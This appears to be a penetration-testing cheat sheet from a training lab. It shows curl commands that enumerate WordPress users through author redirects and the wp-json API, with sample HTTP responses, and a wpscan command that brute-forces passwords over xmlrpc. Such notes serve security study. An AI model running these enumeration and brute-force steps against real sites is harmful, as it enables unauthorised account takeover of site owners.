# Hacking Wordpress

- **User Enumeration**
    - Existing User:
    ```bash
    curl -s -I http://blog.inlanefreight.com/?author=1

    HTTP/1.1 301 Moved Permanently
    Date: Wed, 13 May 2020 20:47:08 GMT
    Server: Apache/2.4.29 (Ubuntu)
    X-Redirect-By: WordPress
    Location: http://blog.inlanefreight.com/index.php/author/admin/
    Content-Length: 0
    Content-Type: text/html; charset=UTF-8
    ```
    - Non-Existing User:
    ```bash
    curl -s -I http://blog.inlanefreight.com/?author=100

    HTTP/1.1 404 Not Found
    Date: Wed, 13 May 2020 20:47:14 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Expires: Wed, 11 Jan 1984 05:00:00 GMT
    Cache-Control: no-cache, must-revalidate, max-age=0
    Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
    Transfer-Encoding: chunked
    Content-Type: text/html; charset=UTF-8
    ```

    - JSON Endpoint
    ```bash
    curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
    curl http://blog.inlanefreight.com/?rest_route=/wp-json/wp/v2/users | jq
    ```


    - Wordpress User bruteforce
    ```bash
    wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
    ```